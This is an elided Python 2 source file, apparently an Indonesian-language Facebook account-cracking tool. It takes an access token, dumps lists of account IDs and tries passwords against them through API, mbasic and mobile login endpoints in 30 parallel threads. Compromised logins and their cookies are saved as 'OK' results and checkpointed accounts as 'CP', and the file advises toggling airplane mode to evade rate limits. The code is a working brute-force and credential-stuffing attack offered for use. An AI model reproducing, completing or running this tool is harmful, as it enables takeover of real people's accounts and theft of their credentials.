...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '\n\n [%s!%s] wkwk gak dapet hasil :('%(M,N);exit()
...
def yayanxd():
    ...
    kontol = raw_input('\n %s[%s?%s] Masukin Token Dulu Bro :%s '%(N,M,N,H))
...
def moch_yayan():
    ...
    print '\033[0;91m__________________________________________________________________________\n';time.sleep(0.03)
...
def cek_ingfo(kontol):
    ...
    jalan('\n [%s✓%s] berhasil mengechek data-data akun facebook\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] YouTube : Aang-XD'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author  : Moh Aang Ardiansyah-XD.'%(N,H,N);time.sleep(0.07)
    ...
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/aang_ardiansyah_xd'%(N,H,N);time.sleep(0.07)
...
### ganti user agent
def seting_yntkts():
    print '\n (%s01%s) ganti user agent'%(O,N)
    print ' (%s02%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah kentod cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            print '\n [%s!%s] gunakan mode pesawat (5detik) saja jika tidak ada hasil\n'%(M,N)
                    ...
                    print ' [%s01%s]. metode API (fast)'%(O,N)
                    print ' [%s02%s]. metode mbasic (slow)'%(O,N)
                    print ' [%s03%s]. metode mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih metode login - silahkan coba satu² ]\n'
            print ' [%s01%s]. metode API (cepat)'%(O,N)
            print ' [%s02%s]. metode mbasic (lambat dan Recommended)'%(O,N)
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [Retakan][%s/%s][OK-:%s][CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r %s[OK NGAB]: %s • %s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s • %s' % (user,pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    month = bulan_ttl[month]
                    print '\r %s[CP NGAB]: %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                ...
                print '\r %s[CP NGAB]: %s • %s                %s' % (K,user,pw,N)
                wrt = ' [×] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %s[OK NGAB]: %s • %s • %s                 %s' % (H,user,pw,kuki,N)
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] Jika tidak ada hasil, gunakan mode pesawat (2 detik)\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
